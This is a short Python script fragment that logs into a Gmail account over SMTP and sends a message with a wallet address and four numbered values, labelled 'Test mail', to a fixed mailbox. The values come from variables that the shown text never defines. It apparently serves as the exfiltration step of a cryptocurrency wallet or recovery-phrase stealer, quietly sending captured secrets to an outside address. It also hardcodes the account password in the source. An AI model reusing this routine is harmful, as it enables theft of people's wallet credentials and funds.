import smtplib, ssl, socket
from email.mime.text import MIMEText

connectionFlag = True
connectionServer = "smtp.gmail.com"
try:
    connectioncheck = smtplib.SMTP(connectionServer, 25)
except socket.error as e:
    connectionFlag = False

def sendEmail():

    sender = '@gmail.com'
    receiver = '@gmail.com'
    password = 'PASSWORD'

    info = f"Wallet: {address} \n1: {msg1} \n2: {msg2}\n3: {msg3}\n4: {msg4}"

    msg = MIMEText(info)

    msg['Subject'] = 'Test mail'
    msg['From'] = '@gmail.com'
    msg['To'] = '@gmail.com'


    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender, password)
        server.sendmail(sender, receiver, msg.as_string())
        print("Mail successfully sent")


if connectionFlag == False:
    print("You're not online..")
else:
    print("Sending Mail")
    sendEmail()
